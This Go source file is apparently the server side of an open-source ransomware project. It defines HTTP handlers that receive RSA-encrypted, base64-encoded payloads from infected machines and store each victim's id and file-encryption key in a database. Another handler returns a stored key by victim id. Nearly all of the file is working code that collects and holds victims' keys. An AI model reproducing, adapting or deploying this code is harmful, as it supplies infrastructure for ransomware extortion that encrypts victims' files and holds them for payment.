package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/julienschmidt/httprouter"
	"github.com/mauri870/ransomware/repository"
	"github.com/mauri870/ransomware/rsa"
)

func addKeys(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	r.ParseForm()

	// Check if payload parameter exists
	if _, ok := r.Form["payload"]; !ok {
		http.Error(w, ApiResponseNoPayload, http.StatusUnprocessableEntity)
		return
	}

	// Decode the base64 string to []byte
	payload, err := base64.StdEncoding.DecodeString(r.FormValue("payload"))
	if err != nil {
		http.Error(w, ApiResponseBadRequest, http.StatusBadRequest)
		return
	}

	// Decrypt the payload
	jsonPayload, err := rsa.Decrypt(PRIV_KEY, payload)
	if err != nil {
		http.Error(w, ApiResponseBadRSAEncryption, http.StatusUnprocessableEntity)
		return
	}

	// Parse the json keys
	keys, err := parseJsonKeys(jsonPayload)
	if err != nil {
		// Bad Json
		http.Error(w, ApiResponseBadJson, http.StatusBadRequest)
		return
	}

	// If nothing goes wrong, persist the keys...
	db := repository.Open(Database)
	defer db.Close()

	if !db.IsAvailable(keys["id"]) {
		// Id already exists
		http.Error(w, ApiResponseDuplicatedId, http.StatusConflict)
		return
	}

	db.CreateOrUpdate(keys["id"], keys["enckey"])

	// Success \o/
	w.WriteHeader(http.StatusNoContent)
}

func getEncryptionKey(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	id := ps.ByName("id")
	if len(id) != 32 {
		http.Error(w, ApiResponseBadRequest, 400)
		return
	}

	// If nothing goes wrong, try get the encryption key...
	db := repository.Open(Database)
	defer db.Close()

	enckey, err := db.Find(id)
	if err != nil {
		http.Error(w, ApiResponseResourceNotFound, 418)
		return
	}

	fmt.Fprintf(w, `{"status": 200, "enckey": "%s"}`, enckey)
}

func notFound(w http.ResponseWriter, r *http.Request) {
	http.Error(w, ApiResponseNotFound, http.StatusNotFound)
	return
}

// Parse the json keys
func parseJsonKeys(body []byte) (map[string]string, error) {
	var keys map[string]string
	if err := json.Unmarshal(body, &keys); err != nil {
		return keys, err
	}

	return keys, nil
}
